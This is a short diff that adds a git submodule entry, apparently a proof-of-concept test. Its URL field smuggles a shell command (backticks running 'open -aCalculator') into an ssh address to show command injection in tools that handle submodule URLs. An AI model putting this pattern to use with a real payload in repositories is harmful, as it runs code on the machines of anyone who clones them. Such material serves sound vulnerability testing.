@@ -1,0 +1,3 @@
+[submodule "sub_poc_test"]
+	path = sub_poc_test
+	url = ssh://'`open -aCalculator`'foo.example.com/bar
